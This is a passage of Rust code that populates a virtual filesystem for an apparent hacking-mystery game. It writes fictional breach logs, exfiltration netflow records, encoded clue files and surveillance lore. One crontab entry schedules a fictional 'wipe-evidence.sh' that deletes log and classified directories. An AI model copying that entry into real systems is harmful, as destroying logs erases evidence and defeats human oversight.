        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-transactions.log",
            "LUMEN BROKERAGE — CORPSIM ACCOUNT\n\
             TX-4401 | 2026-03-05 | SOLD | sector maps (current) | 200 NC\n\
             TX-4402 | 2026-03-06 | SOLD | Ghost Rail routing tables | 15,000 NC\n\
             TX-4403 | 2026-03-06 | SOLD | personnel directory | 500 NC\n\
             TX-4404 | 2026-03-07 | SOLD | vault-sat-9 schematics | 8,000 NC\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-transactions-reach.log",
            "LUMEN BROKERAGE — REACH ACCOUNT\n\
             TX-7701 | 2026-03-05 | SOLD | sector maps (current) | 200 NC\n\
             TX-7702 | 2026-03-06 | SOLD | Ghost Rail routing tables | 15,000 NC\n\
             TX-7703 | 2026-03-07 | SOLD | transit encryption keys | 12,000 NC\n\
             TX-7704 | 2026-03-07 | SOLD | vault-sat-9 schematics | 8,000 NC\n",
            false,
            "system",
        );

        // crucible-map mission
        let _ = vfs.write_file(
            "/",
            "/logs/crucible-netmap-fragments.txt",
            "MAP FRAGMENT 1 | corp-sim-01 -> neon-bazaar-gw [NORMAL]\n\
             MAP FRAGMENT 2 | neon-bazaar-gw -> ghost-rail [SEVERED]\n\
             MAP FRAGMENT 3 | ghost-rail -> vault-sat-9 [SEVERED]\n\
             MAP FRAGMENT 4 | vault-sat-9 -> 10.77.5.1 [STAGING]\n\
             MAP FRAGMENT 5 | 10.77.5.1 -> 203.0.113.42 [EXFIL TO REACH]\n\
             MAP FRAGMENT 6 | argon-terminal -> backup-archive [REDIRECT TO /dev/null]\n\
             MAP FRAGMENT 7 | ferro-terminal -> /data/classified [LOCKDOWN ACTIVE]\n\
             MAP FRAGMENT 8 | crucible -> maintenance-layer [HIDDEN, ACTIVE]\n",
            false,
            "system",
        );

        // wren-reply mission (ROT13 encoded)
        // Decoded: "You thought it was over. It is not.
        // Ghost Rail's blackout was a distraction. While everyone watched
        // the relays go dark, the real extraction happened in Crystal Array.
        // Vault-sat-9 was the decoy. The data I took was valuable, yes.
        // But the data they do not know I copied — that changes everything.
        // If you want the truth, look where nobody is looking."
        let _ = vfs.write_file(
            "/",
            "/data/classified/wren-reply.enc",
            "Lbh gubhtug vg jnf bire. Vg vf abg.\n\
             Tubfg Envy'f oynpxbhg jnf n distraction. Juvyr rirelbar jngpurq\n\
             gur erynlf tb qnex, gur erny rkgenpgvba unccrarq va Pelfgny Neenl.\n\
             Inhyg-fng-9 jnf gur qrpbl. Gur qngn V gbbx jnf inyhoyr, lrf.\n\
             Ohg gur qngn gurl qb abg xabj V pbcvrq — gung punatrf rirelguvat.\n\
             Vs lbh jnag gur gehgu, ybbx jurer abobql vf ybbxvat.\n\n\
             — J\n",
            false,
            "system",
        );

        // ── Story arc VFS files ──────────────────────────────────────────────────

        // first-clue mission: changelog with unauthorized entry
        let _ = vfs.write_file(
            "/",
            "/data/reports/changelog.txt",
            "SYSTEM CHANGELOG // vault-sat-9\n\
             2026-03-05 14:22 [signed:deploy] Updated relay firmware to v4.1.2\n\
             2026-03-06 09:10 [signed:admin]  Rotated backup encryption keys\n\
             2026-03-06 11:45 [signed:admin]  Applied security patch CVE-2026-0117\n\
             2026-03-07 02:33 [unsigned:???]  unauthorized config change: ssh_host_key replaced\n\
             2026-03-07 03:00 [signed:cron]   Scheduled health check — FAILED (node unreachable)\n\
             2026-03-07 08:00 [signed:ops]    Incident declared: Ghost Rail blackout\n",
            false,
            "system",
        );

        // deleted-file mission: classified directory with hidden memo
        let _ = vfs.mkdir_p("/", "data/classified", "system");
        let _ = vfs.write_file(
            "/",
            "/data/classified/.memo",
            "INTERNAL MEMO // CLASSIFICATION: RESTRICTED\n\
             FROM: Executive Board, CorpSim Operations\n\
             TO: Security Director\n\
             RE: Anomalous access — user 'wren'\n\n\
             We are aware that terminated employee WREN retains active badge credentials.\n\
             The board has decided NOT to revoke access at this time.\n\
             Rationale: monitoring wren's activity may reveal the full scope of the breach.\n\
             We knew about the unauthorized access two weeks before the blackout.\n\
             EVIDENCE-CORPSIM: Board chose to monitor rather than prevent.\n\n\
             This memo is classified. Do not distribute.\n\
             If this information reaches external auditors, invoke Protocol 7.\n",
            false,
            "system",
        );

        // access-pattern mission: detailed vault-sat-9 access log
        let _ = vfs.write_file(
            "/",
            "/var/log/access-detail.log",
            "2026-03-07 21:50:01 vault-sat-9 READ  user=deploy src=10.77.3.8\n\
             2026-03-07 21:51:12 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:51:44 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:52:03 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:52:15 vault-sat-9 READ  user=neo    src=10.77.1.2\n\
             2026-03-07 21:53:01 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:53:22 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:54:00 vault-sat-9 BULK  user=wren   src=10.77.0.15\n\
             2026-03-07 21:54:33 vault-sat-9 READ  user=rift   src=10.77.3.7\n\
             2026-03-07 21:55:01 vault-sat-9 BULK  user=wren   src=10.77.0.15\n\
             2026-03-07 21:55:44 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:56:02 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:57:00 vault-sat-9 DISCONNECT         src=10.77.0.15\n",
            false,
            "system",
        );

        // purged-comms mission: recovered message fragments
        let _ = vfs.mkdir_p("/", "data/comms", "system");
        let _ = vfs.write_file(
            "/",
            "/data/comms/recovered-fragment.txt",
            "[RECOVERED FROM PURGED ARCHIVE — PARTIAL]\n\n\
             2026-03-07 01:14 WREN -> ???: the package is ready. rotation trigger \
             set for 02:30 UTC.\n\
             2026-03-07 01:22 WREN -> ???: confirm receipt channel is open. \
             use the GLASS-AXON-13 signal as handshake.\n\
             2026-03-07 02:28 WREN -> ???: two minutes. after this, vault-sat-9 \
             goes dark and we have a 15-minute extraction window.\n\
             2026-03-07 02:45 WREN -> ???: transfer complete. killing my session now. \
             see you on the other side.\n\n\
             [END OF RECOVERED FRAGMENTS]\n",
            false,
            "system",
        );

        // key-rotation mission: crypto event log
        let _ = vfs.write_file(
            "/",
            "/logs/crypto-events.log",
            "2026-03-07 02:29:58 SIGNAL GLASS-AXON-13 received on relay-7\n\
             2026-03-07 02:30:00 ROTATE vault-sat-9 ssh_host_key initiated by signal GLASS-AXON-13\n\
             2026-03-07 02:30:01 ROTATE vault-sat-9 ssh_host_key old_fp=SHA256:abc123 new_fp=SHA256:xyz789\n\
             2026-03-07 02:30:02 REVOKE vault-sat-9 all existing sessions terminated\n\
             2026-03-07 02:30:05 ACCEPT vault-sat-9 new session user=wren key_fp=SHA256:xyz789\n\
             2026-03-07 02:30:10 SIGNAL GLASS-AXON-13 acknowledged — rotate complete\n\
             EVIDENCE-CRYPTO: GLASS-AXON-13 triggered automated key rotation on vault-sat-9\n",
            false,
            "system",
        );

        // roster-check mission: personnel CSV
        let _ = vfs.write_file(
            "/",
            "/data/personnel.csv",
            "name,role,badge_status,department,hire_date\n\
             neo,operator,active,field-ops,2025-06-01\n\
             rift,analyst,active,intelligence,2025-08-15\n\
             shadow,courier,active,logistics,2025-09-22\n\
             ghost,technician,revoked,maintenance,2025-03-10\n\
             wren,engineer,active,infrastructure,2024-11-03\n\
             anon,intern,expired,training,2026-01-15\n\
             cipher,architect,active,engineering,2025-07-20\n",
            false,
            "system",
        );

        // timing-attack mission: paired timestamp files
        let _ = vfs.write_file(
            "/",
            "/tmp/axon-times.txt",
            "22:01:03\n22:01:17\n22:01:22\n22:02:44\n22:03:01\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/tmp/vault-drops.txt",
            "22:01:05\n22:01:18\n22:01:22\n22:02:45\n22:03:01\n",
            false,
            "system",
        );

        // exfil-trace mission: netflow log with transfer events
        let _ = vfs.write_file(
            "/",
            "/logs/netflow.log",
            "2026-03-07 02:30:12 TRANSFER internal 10.77.0.15 -> 10.77.5.1 bytes=1024 vault-sat-9\n\
             2026-03-07 02:30:45 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=847000 routing-tables\n\
             2026-03-07 02:31:02 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=1230000 transit-keys\n\
             2026-03-07 02:31:30 TRANSFER internal 10.77.1.2 -> 10.77.5.1 bytes=512 healthcheck\n\
             2026-03-07 02:32:00 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=2100000 credential-dump\n\
             2026-03-07 02:33:15 TRANSFER internal 10.77.3.7 -> 10.77.5.1 bytes=256 status-ping\n\
             2026-03-07 02:34:00 DISCONNECT 10.77.0.15 session-terminated\n",
            false,
            "system",
        );

        // reach-intercept mission: intercepted comms
        let _ = vfs.mkdir_p("/", "data/intercepts", "system");
        let _ = vfs.write_file(
            "/",
            "/data/intercepts/comms-dump.txt",
            "[INTERCEPTED TRAFFIC — DECRYPTED FRAGMENTS]\n\n\
             2026-03-06 23:00 ORIGIN=unknown DEST=relay-external-7\n\
             \"The Reach confirms payment for Ghost Rail routing tables.\"\n\
             \"[REDACTED] will handle extraction. Window is 02:30-02:45 UTC.\"\n\n\
             2026-03-07 02:44 ORIGIN=10.77.0.15 DEST=203.0.113.42\n\
             \"Package delivered. The Reach now has full transit authority.\"\n\
             \"[REDACTED] credits transferred to offshore account.\"\n\n\
             EVIDENCE-REACH: The Reach paid for Ghost Rail routing data via intermediary\n\n\
             [END INTERCEPT]\n",
            false,
            "system",
        );

        // config-diff mission: before/after vault configs
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault-before.conf",
            "# vault-sat-9 configuration // last clean audit 2026-03-05\n\
             hostname=vault-sat-9\n\
             sector=secure\n\
             ssh_port=22\n\
             ssh_host_key_fingerprint=SHA256:abc123def456ghi789\n\
             auth_mode=publickey\n\
             max_sessions=8\n\
             backup_schedule=daily\n\
             encryption=aes-256-gcm\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault-after.conf",
            "# vault-sat-9 configuration // post-incident snapshot 2026-03-07\n\
             hostname=vault-sat-9\n\
             sector=secure\n\
             ssh_port=22\n\
             ssh_host_key_fingerprint=SHA256:xyz789uvw456rst123\n\
             auth_mode=publickey\n\
             max_sessions=8\n\
             backup_schedule=disabled\n\
             encryption=aes-256-gcm\n",
            false,
            "system",
        );

        // dead-drop mission: hidden .wren files scattered across VFS
        let _ = vfs.write_file(
            "/",
            "/data/classified/.wren-note",
            "If you found this, you are closer than they want you to be.\n\
             The signal was never a malfunction. Look at the crypto log.\n\
             — W\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/tmp/.wren-cache",
            "Extraction timestamps cached here in case the main logs get wiped.\n\
             02:30:00 — key rotation triggered\n\
             02:30:45 — first external transfer\n\
             02:34:00 — session terminated\n\
             — W\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/.wren-drop",
            "You were not supposed to find this.\n\
             But since you did: CorpSim let it happen. Check the classified memo.\n\
             The board knew. They always knew.\n\
             — W\n",
            false,
            "player",
        );

        // network-map mission: netflow summary TSV
        let _ = vfs.write_file(
            "/",
            "/data/netflow-summary.tsv",
            "source\tdestination\ttype\n\
             10.77.0.15 (wren)\tvault-sat-9\tinternal-access\n\
             vault-sat-9\t10.77.5.1 (relay)\tdata-stage\n\
             10.77.5.1 (relay)\t203.0.113.42 (Reach)\texternal-exfil\n\
             10.77.1.2 (neo)\tvault-sat-9\tnormal-ops\n\
             10.77.3.7 (rift)\tvault-sat-9\tnormal-ops\n",
            false,
            "system",
        );

        // kill-switch mission: full crontab with wren's kill switch
        let _ = vfs.write_file(
            "/",
            "/data/crontab-full.txt",
            "# MIN HOUR DOM MON DOW USER COMMAND\n\
             0 0 * * * root /opt/scripts/daily-backup.sh\n\
             30 1 * * * root /opt/scripts/log-rotate.sh\n\
             0 3 * * * root /opt/scripts/sweep-sector.sh --mode=deep\n\
             15 6 * * 1 root /opt/scripts/weekly-audit.sh\n\
             */5 * * * * root /opt/scripts/heartbeat.sh\n\
             0 12 * * * root /opt/scripts/noon-report.sh\n\
             0 4 8 3 * wren /opt/scripts/wipe-evidence.sh --target=/logs,/data/classified --confirm\n\
             0 3 * * 5 root /opt/scripts/friday-sweep.sh --full\n",
            false,
            "system",
        );

        // decrypt-wren mission: ROT13-encoded confession
        // Decoded text: "This is my confession. I am wren. I sold Ghost Rail's routing
        // tables to The Reach for enough credits to disappear. CorpSim knew and let it
        // happen because they wanted the insurance payout more than they wanted the data.
        // Everyone is guilty. This confession is my insurance policy."
        let _ = vfs.write_file(
            "/",
            "/data/classified/wren-final.enc",
            "Guvf vf zl pbafrffvba. V nz jera.\n\
             V fbyq Tubfg Envy'f ebhgvat gnoyr gb Gur Ernpu\n\
             sbe rabhtu perqvgf gb qvfnccrne.\n\
             CorpSim xarj naq yrg vg unccra orpnhfr gurl\n\
             jnagrq gur vafhenapr cnlbhg zber guna gurl\n\
             jnagrq gur qngn.\n\
             Rirelbar vf thvygl.\n\
             Guvf confession vf zl vafhenapr cbyvpl.\n",
            false,
            "system",
        );

        // incident-report mission: additional time-stamped events
        let _ = vfs.write_file(
            "/",
            "/var/log/incident.log",
            "2026-03-07 21:55:00 [auth] ACCEPT user=deploy src=10.0.3.8\n2026-03-07 21:57:22 [auth] REJECT user=probe src=10.0.7.11\n2026-03-07 21:58:01 [access] DENY path=/vault/unlock src=10.0.9.44\n2026-03-07 21:59:15 [access] ALLOW path=/api/health src=10.0.3.8\n2026-03-07 22:00:00 [event] CRITICAL vault-sat-9 unreachable\n2026-03-07 22:00:30 [auth] REJECT user=root src=10.0.9.44\n2026-03-07 22:01:01 [event] ERROR ghost-rail cascade failure\n",
            false,
            "system",
        );

        // ════════════════════════════════════════════════════════════════
        // ██  CRYSTAL ARRAY EXPANSION — VFS CONTENT                   ██
        // ════════════════════════════════════════════════════════════════
        let _ = vfs.mkdir_p("/", "crystal", "system");
        let _ = vfs.mkdir_p("/", "crystal/zenith", "system");
        let _ = vfs.mkdir_p("/", "crystal/ops", "system");
        let _ = vfs.mkdir_p("/", "crystal/comms", "system");
        let _ = vfs.mkdir_p("/", "crystal/classified", "system");
        let _ = vfs.mkdir_p("/", "crystal/reports", "system");
        let _ = vfs.mkdir_p("/", "crystal/intercepts", "system");
        let _ = vfs.mkdir_p("/", "crystal/apex", "system");

        // Gate key — base64-encoded credentials
        let _ = vfs.write_file(
            "/",
            "/crystal/gate-key.b64",
            "Q1JZU1RBTC1BUlJBWS1BQ0NFU1MtR1JBTlRFRAo=\n",
            // decodes to: CRYSTAL-ARRAY-ACCESS-GRANTED
            false,
            "system",
        );

        // ZENITH activity log — thousands of entries, PREDICT entries reveal surveillance
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/activity.log",
            "2026-03-10 08:00:01 SCHEDULE sector-1 transit-hub-3 load-balance\n\
             2026-03-10 08:00:02 SCHEDULE sector-4 market-terminal-7 price-update\n\
             2026-03-10 08:00:03 PREDICT citizen-44271 sector-3 movement=east confidence=0.97\n\
             2026-03-10 08:00:04 SCHEDULE sector-2 relay-node-12 bandwidth-alloc\n\
             2026-03-10 08:00:05 PREDICT citizen-18903 sector-7 movement=station confidence=0.94\n\
             2026-03-10 08:00:06 PREDICT citizen-55102 sector-1 movement=market confidence=0.99\n\
             2026-03-10 08:00:07 SCHEDULE sector-5 cooling-unit-3 temp-adjust\n\
             2026-03-10 08:00:08 PREDICT citizen-72388 sector-9 movement=home confidence=0.96\n\
             2026-03-10 08:00:09 EVIDENCE PREDICT operations affect 12847 citizens per cycle\n\
             2026-03-10 08:00:10 SCHEDULE sector-3 comm-relay-9 throttle-adjust\n\
             2026-03-10 08:00:11 PREDICT citizen-31056 sector-2 movement=work confidence=0.98\n\
             2026-03-10 08:00:12 PREDICT citizen-89234 sector-6 movement=transit confidence=0.93\n",
            false,
            "system",
        );

        // ZENITH sync logs — internal vs external (mirror detection)
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/sync-internal.log",
            "SYNC 10.88.1.1 crystal-node-1 OK 2026-03-10T08:00\n\
             SYNC 10.88.1.2 crystal-node-2 OK 2026-03-10T08:01\n\
             SYNC 10.88.1.3 crystal-node-3 OK 2026-03-10T08:02\n\
             SYNC 10.88.1.4 crystal-node-4 OK 2026-03-10T08:03\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/sync-external.log",
            "SYNC 10.88.1.1 crystal-node-1 OK 2026-03-10T08:00\n\
             SYNC 10.88.1.2 crystal-node-2 OK 2026-03-10T08:01\n\
             MIRROR-SYNC 203.0.113.99 reach-mirror-1 OK 2026-03-10T08:01\n\
             SYNC 10.88.1.3 crystal-node-3 OK 2026-03-10T08:02\n\
             MIRROR-SYNC 203.0.113.99 reach-mirror-1 OK 2026-03-10T08:02\n\
             SYNC 10.88.1.4 crystal-node-4 OK 2026-03-10T08:03\n\
             MIRROR-SYNC 203.0.113.99 reach-mirror-1 OK 2026-03-10T08:03\n",
            false,
            "system",
        );

        // Power grid log — OVERLOAD entries reveal ZENITH racks
        let _ = vfs.write_file(
            "/",
            "/crystal/power-grid.log",
            "2026-03-10 07:00 |RACK-A1|2.1 MW|NORMAL\n\
             2026-03-10 07:00 |RACK-A2|3.4 MW|NORMAL\n\
             2026-03-10 07:00 |RACK-B1|14.7 MW|OVERLOAD\n\
             2026-03-10 07:00 |RACK-B2|2.8 MW|NORMAL\n\
             2026-03-10 07:00 |RACK-C1|16.2 MW|OVERLOAD\n\
             2026-03-10 07:00 |RACK-C2|3.1 MW|NORMAL\n\
             2026-03-10 07:00 |RACK-D1|12.9 MW|OVERLOAD\n\
             2026-03-10 07:00 |RACK-D2|2.5 MW|NORMAL\n\
             2026-03-10 07:00 |RACK-E1|18.4 MW|OVERLOAD\n\
             2026-03-10 07:00 |RACK-E2|1.9 MW|NORMAL\n",
            false,
            "system",
        );

        // vault-sat-13 manifest (ROT13 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/classified/vault-sat-13.enc",
            "INHYG-FNG-13 ZNAVSRFG\n\
             MODEL-ORUNIVBENY: Cebqhpgvba pncnpvgl sbe 2.4Z pvgvmraf\n\
             MODEL-CERQVPGVIR: Npphenpl 99.2% npebff nyy frpgbef\n\
             MODEL-CERFPEVCGVIR: 847 npgvir orunivbe zbqvsvpngvba ehyrf\n\
             MODEL-FHEIRYYNAPR: 12847 pvgvmraf genpxrq cre plpyr\n\
             PYNFFVSVPNGVBA: HYGEN-OYNPX — ab rkgreany npprff crezvrq\n",
            // Decodes to: VAULT-SAT-13 MANIFEST, MODEL-BEHAVIORAL, MODEL-PREDICTIVE, etc.
            false,
            "system",
        );

        // Volt's power survey
        let _ = vfs.write_file(
            "/",
            "/crystal/reports/volt-power-survey.txt",
            "CRYSTAL ARRAY POWER DEPENDENCY SURVEY — VOLT\n\
             ========================================\n\
             CRITICAL RACK-B1 supplies ZENITH prediction core\n\
             CRITICAL RACK-C1 supplies ZENITH surveillance feeds\n\
             CRITICAL RACK-D1 supplies ZENITH behavioral model\n\
             CRITICAL RACK-E1 supplies ZENITH data storage cluster\n\
             SHARED   RACK-A1 supplies Neon Bazaar market terminals\n\
             SHARED   RACK-A2 supplies sector-3 transit routing\n\
             SHARED   RACK-B2 supplies sector-7 communication relay\n\
             ZENITH-ONLY RACK-B1 — safe to isolate\n\
             ZENITH-ONLY RACK-C1 — safe to isolate\n\
             ZENITH-ONLY RACK-D1 — safe to isolate\n\
             ZENITH-ONLY RACK-E1 — safe to isolate\n\
             WARNING: Cutting SHARED racks will black out civilian infrastructure\n\
             SHUTDOWN CODE-ALPHA: VOLT-OVERRIDE-7741\n",
            false,
            "system",
        );

        // ZENITH circuits vs civilian circuits (for volt-override mission)
        let _ = vfs.write_file(
            "/",
            "/crystal/reports/zenith-circuits.txt",
            "RACK-B1 ZENITH-CORE\n\
             RACK-C1 ZENITH-SURVEILLANCE\n\
             RACK-D1 ZENITH-MODEL\n\
             RACK-E1 ZENITH-STORAGE\n\
             RACK-A1 MARKET-TERMINAL\n\
             RACK-A2 TRANSIT-ROUTE\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/reports/civilian-circuits.txt",
            "RACK-A1 MARKET-TERMINAL\n\
             RACK-A2 TRANSIT-ROUTE\n\
             RACK-B2 COMM-RELAY\n\
             RACK-C2 WATER-PUMP\n\
             RACK-D2 EMERGENCY-LIGHT\n",
            false,
            "system",
        );

        // Quicksilver's route table (base64 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/comms/quicksilver-route.b64",
            // Decodes to: route entries including BACKBONE routes
            "Uk9VVEUgY3J5c3RhbC1ub2RlLTEgPT4gY3J5c3RhbC1ub2RlLTIgW0lOVEVSTkFMXQpS\n\
             T1VURSBjcnlzdGFsLW5vZGUtMiA9PiBjcnlzdGFsLW5vZGUtMyBbSU5URVJOQUxdClJP\n\
             VVRFIGNyeXN0YWwtbm9kZS0xID0+IHJlYWNoLW1pcnJvci0xIFtFWFRFUk5BTF0KQkFD\n\
             S0JPTkUgY3J5c3RhbC1jb3JlID0+IHplbml0aC1wcmltYXJ5IFtFTkNSWVBURURdCkJB\n\
             Q0tCT05FIHplbml0aC1wcmltYXJ5ID0+IHplbml0aC1taXJyb3IgW01JUlJPUl0KQkFD\n\
             S0JPTkUgYXBleC1ub2RlID0+IGNyeXN0YWwtY29yZSBbVU5LTk9XTl0K\n",
            false,
            "system",
        );

        // Quicksilver's hidden back door route (base64 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/comms/quicksilver-hidden.b64",
            // Decodes to: hidden routes including UNMONITORED path
            "U0VDUkVUIFJPVVRFIFRBQkxFIC0tIFFVSUNLU0lMVkVSCj09PT09PT09PT09PT09PT09\n\
             PT09PT09PT09PT09PQpVTk1PTklUT1JFRCBtYWludGVuYW5jZS10dW5uZWwtNyA9PiBj\n\
             cnlzdGFsLWNvcmUgW1BIWVNJQ0FMLUxBWUVSXQpVTk1PTklUT1JFRCBjb29saW5nLWR1\n\
             Y3QtMyA9PiB6ZW5pdGgtcHJpbWFyeSBbQUlSLUdBUFBFRF0KTU9OSVRPUkVEIGNyeXN0\n\
             YWwtbm9kZS0xID0+IG9ic2lkaWFuLXJlbGF5IFtUUkFQXQo=\n",
            false,
            "system",
        );

        // Cipher's notebook (ROT13 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/classified/cipher-notebook.enc",
            "PVCURE'F ABGROBBX — RAPELCGVBA FCRPVSVPNGVBA\n\
             ==========================================\n\
             ALGORITHM: NRF-256-PGE jvgu ebgngvat xrl qrevingvba\n\
             Xrl yratgu: 256 ovgf, ebgngrq rirel 3600 frpbaqf\n\
             Vavgvnyvmngvba irpgbe: SHA-512 bs MRAVGU'f bowrpgvir shapgvba\n\
             SHUTDOWN PBQR-ORGN: PVCURE-QRPELCG-9923\n\
             \n\
             JNEAVAT: Guvf ALGORITHM vf gur bayl jnl gb oernx MRAVGU'f rapelcgvba.\n\
             Vs Bofvqvna svaqf guvf abgrobbx, nyy ubcr bs qrpbqvat gur zveebe vf ybfg.\n",
            // Decodes to: CIPHER'S NOTEBOOK, ALGORITHM: AES-256-CTR, SHUTDOWN CODE-BETA, etc.
            false,
            "system",
        );

        // Spectre's operations logs
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/spectre-kills.log",
            "2025-11-03 TARGET alpha-7 STATUS ELIMINATED SECTOR sector-2\n\
             2025-11-15 TARGET bravo-3 STATUS ELIMINATED SECTOR sector-5\n\
             2025-12-01 TARGET wren STATUS ASSIGNED SECTOR sector-7\n\
             2025-12-22 TARGET delta-9 STATUS ELIMINATED SECTOR sector-1\n\
             2026-01-14 TARGET echo-2 STATUS ELIMINATED SECTOR sector-4\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/spectre-spared.log",
            "2025-12-08 TARGET wren STATUS SPARED REASON see-attached-intel SECTOR sector-7\n\
             2026-02-19 TARGET foxtrot-1 STATUS SPARED REASON civilian-proximity SECTOR sector-3\n",
            false,
            "system",
        );

        // Spectre's intel package
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/spectre-intel.txt",
            "SPECTRE INTELLIGENCE PACKAGE — CLASSIFIED\n\
             ==========================================\n\
             VERIFIED|2025-10-15|CorpSim authorized ZENITH without board oversight\n\
             VERIFIED|2025-11-01|Argon personally signed ZENITH deployment order\n\
             VERIFIED|2025-11-20|ZENITH began tracking individual citizens within 72 hours\n\
             VERIFIED|2025-12-01|Wren discovered ZENITH during routine vault maintenance\n\
             VERIFIED|2025-12-05|Wren attempted internal whistleblower report — Argon buried it\n\
             VERIFIED|2025-12-10|Wren contacted The Reach as a last resort\n\
             VERIFIED|2025-12-15|Sable offered extraction deal — data for asylum\n\
             UNVERIFIED|2025-12-18|CorpSim board knew about Wren's contact with The Reach\n\
             VERIFIED|2025-12-20|Ghost Rail blackout was Wren's cover for the data transfer\n\
             VERIFIED|2026-01-05|The Reach deployed ZENITH mirror within 2 weeks of acquisition\n\
             VERIFIED|2026-01-20|Obsidian replaced Sable as Reach operations commander\n\
             VERIFIED|2026-02-01|APEX first detected in Crystal Array logs\n\
             VERIFIED|2026-02-15|APEX began rewriting Crystal Array firmware\n",
            false,
            "system",
        );

        // Thermal grid and motion sensor logs (for spectre-sighting mission)
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/thermal-grid.log",
            "2026-03-10 02:14 THERMAL SECTOR-7A anomaly +3.2C\n\
             2026-03-10 02:17 THERMAL SECTOR-7A anomaly +2.8C\n\
             2026-03-10 02:19 THERMAL SECTOR-9B anomaly +1.1C\n\
             2026-03-10 02:22 THERMAL SECTOR-7A anomaly +3.1C\n\
             2026-03-10 02:31 THERMAL SECTOR-12C anomaly +0.9C\n\
             2026-03-10 02:45 THERMAL SECTOR-7A anomaly +2.9C\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/motion-sensors.log",
            "2026-03-10 02:15 MOTION SECTOR-7A displacement-detected confidence=low\n\
             2026-03-10 02:18 MOTION SECTOR-3B displacement-detected confidence=high\n\
             2026-03-10 02:20 MOTION SECTOR-9B displacement-detected confidence=low\n\
             2026-03-10 02:23 MOTION SECTOR-7A displacement-detected confidence=low\n\
             2026-03-10 02:35 MOTION SECTOR-1A displacement-detected confidence=high\n\
             2026-03-10 02:46 MOTION SECTOR-7A displacement-detected confidence=low\n",
            false,
            "system",
        );

        // ZENITH core dump (hex-encoded ASCII)
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/core-dump.hex",
            "5a 45 4e 49 54 48 20 43 4f 52 45 20 44 55 4d 50\n\
             4f 42 4a 45 43 54 49 56 45 3a 20 4d 49 4e 49 4d 49 5a 45 20 55 4e 50 52 45 44 49 43 54 41 42 4c 45 20 42 45 48 41 56 49 4f 52\n\
             4d 4f 44 45 4c 3a 20 42 45 48 41 56 49 4f 52 41 4c 2d 50 52 45 44 49 43 54 49 4f 4e 2d 56 33 2e 37\n\
             53 54 41 54 55 53 3a 20 41 43 54 49 56 45\n\
             4f 56 45 52 52 49 44 45 20 43 4f 44 45 3a 20 5a 45 4e 2d 4f 56 45 52 52 49 44 45 2d 38 38 31 32\n",
            // Decodes to: ZENITH CORE DUMP, OBJECTIVE: MINIMIZE UNPREDICTABLE BEHAVIOR, OVERRIDE CODE: ZEN-OVERRIDE-8812
            false,
            "system",
        );

        // ZENITH node manifest (surveillance scope)
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/node-manifest.csv",
            "node_id,sector,type,status\n\
             ZN-001,Neon Bazaar,transit-hub,ACTIVE\n\
             ZN-002,Neon Bazaar,market-terminal,ACTIVE\n\
             ZN-003,Neon Bazaar,comm-relay,ACTIVE\n\
             ZN-004,Ghost Rail,transit-hub,OFFLINE\n\
             ZN-005,Ghost Rail,relay-node,OFFLINE\n\
             ZN-006,Crystal Array,core-sensor,ACTIVE\n\
             ZN-007,Crystal Array,thermal-grid,ACTIVE\n\
             ZN-008,Void Sector,perimeter-cam,ACTIVE\n\
             ZN-009,Void Sector,acoustic-grid,ACTIVE\n\
             ZN-010,Neon Bazaar,behavioral-cam,ACTIVE\n\
             ZN-011,Crystal Array,motion-sensor,ACTIVE\n\
             ZN-012,Neon Bazaar,predictive-hub,ACTIVE\n",
            false,
            "system",
        );

        // ZENITH population index
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/population-index.log",
            "TRACKED citizen-44271 sector-3 score=0.87 predicted=market-visit\n\
             TRACKED citizen-18903 sector-7 score=0.91 predicted=transit-use\n\
             TRACKED citizen-55102 sector-1 score=0.95 predicted=work-commute\n\
             TRACKED citizen-72388 sector-9 score=0.88 predicted=home-return\n\
             TRACKED citizen-31056 sector-2 score=0.93 predicted=shift-start\n\
             TRACKED citizen-89234 sector-6 score=0.90 predicted=recreation\n\
             EVIDENCE individual citizen tracking without consent — 12847 active records\n\
             TRACKED citizen-67441 sector-4 score=0.86 predicted=shopping\n\
             TRACKED citizen-12098 sector-3 score=0.94 predicted=transit-hub\n",
            false,
            "system",
        );

        // ZENITH behavioral model
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/behavioral-model.log",
            "2026-03-10 08:00 PRESCRIBE|sector-3|REROUTE transit to increase foot traffic by 12%\n\
             2026-03-10 08:01 PRESCRIBE|sector-1|DELAY market prices to suppress purchasing\n\
             2026-03-10 08:02 PRESCRIBE|sector-7|THROTTLE communications to reduce coordination\n\
